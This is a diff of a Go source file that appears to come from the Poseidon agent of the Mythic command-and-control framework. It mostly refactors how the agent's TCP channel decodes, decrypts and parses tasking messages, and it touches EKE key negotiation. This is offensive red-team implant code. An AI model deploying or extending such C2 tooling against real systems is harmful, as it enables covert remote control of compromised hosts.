@@ -1,3 +1,4 @@
+//go:build (linux || darwin) && poseidon_tcp
 // +build linux darwin
 // +build poseidon_tcp
 
@@ -111,6 +112,7 @@ func (c *C2Default) handleEgressConnectionIncomingMessage(conn net.Conn) {
 	// These are normally formatted messages for our agent
 	// in normal base64 format with our uuid, parse them as such
 	var sizeBuffer uint32
+	var enc_raw []byte
 	//fmt.Printf("handleEgressConnectionIncomingMessage started\n")
 	for {
 		err := binary.Read(conn, binary.BigEndian, &sizeBuffer)
@@ -151,27 +153,23 @@ func (c *C2Default) handleEgressConnectionIncomingMessage(conn net.Conn) {
 				totalRead = totalRead + uint32(readSoFar)
 			}
 			//fmt.Printf("Read %d bytes from connection\n", totalRead)
-			raw, err := base64.StdEncoding.DecodeString(string(readBuffer))
-			if err != nil {
+			if raw, err := base64.StdEncoding.DecodeString(string(readBuffer)); err != nil {
 				//log.Println("Error decoding base64 data: ", err.Error())
 				continue
-			}
-
-			if len(raw) < 36 {
+			} else if len(raw) < 36 {
 				continue
-			}
-
-			enc_raw := raw[36:] // Remove the Payload UUID
-			// if the AesPSK is set and we're not in the midst of the key exchange, decrypt the response
-			if len(c.Key) != 0 {
+			} else if len(c.Key) != 0 {
 				//log.Println("just did a post, and decrypting the message back")
-				enc_raw = c.decryptMessage(enc_raw)
+				enc_raw = c.decryptMessage(raw[36:])
 				//log.Println(enc_raw)
 				if len(enc_raw) == 0 {
 					// failed somehow in decryption
 					continue
 				}
+			} else {
+				enc_raw = raw[36:]
 			}
+			// if the AesPSK is set and we're not in the midst of the key exchange, decrypt the response
 			if c.FinishedStaging {
 				taskResp := structs.MythicMessageResponse{}
 				err = json.Unmarshal(enc_raw, &taskResp)
@@ -197,7 +195,7 @@ func (c *C2Default) handleEgressConnectionIncomingMessage(conn net.Conn) {
 						SetMythicID(checkinResp.ID)
 						c.FinishedStaging = true
 					} else {
-						fmt.Printf("Failed to checkin, got a weird message: %s\n", string(enc_raw))
+						//fmt.Printf("Failed to checkin, got a weird message: %s\n", string(enc_raw))
 					}
 				}
 			}
@@ -243,7 +241,7 @@ func (c *C2Default) FinishNegotiateKey(resp []byte) bool {
 	return true
 }
 
-//NegotiateKey - EKE key negotiation
+// NegotiateKey - EKE key negotiation
 func (c *C2Default) NegotiateKey() bool {
 	sessionID := GenerateSessionID()
 	pub, priv := crypto.GenerateRSAKeyPair()
@@ -264,7 +262,7 @@ func (c *C2Default) NegotiateKey() bool {
 	return c.SendMessage(raw).(bool)
 }
 
-//htmlPostData HTTP POST function
+// htmlPostData HTTP POST function
 func (c *C2Default) SendMessage(sendData []byte) interface{} {
 	// If the AesPSK is set, encrypt the data we send
 	if len(c.Key) != 0 {
@@ -376,6 +374,8 @@ func (c *C2Default) encryptMessage(msg []byte) []byte {
 
 func (c *C2Default) decryptMessage(msg []byte) []byte {
 	key, _ := base64.StdEncoding.DecodeString(c.Key)
+	//fmt.Printf("Decrypting with key: %s\n", hex.EncodeToString(key))
+	//fmt.Printf("Decrypting message: %s\n", hex.EncodeToString(msg))
 	return crypto.AesDecrypt(key, msg)
 }
 
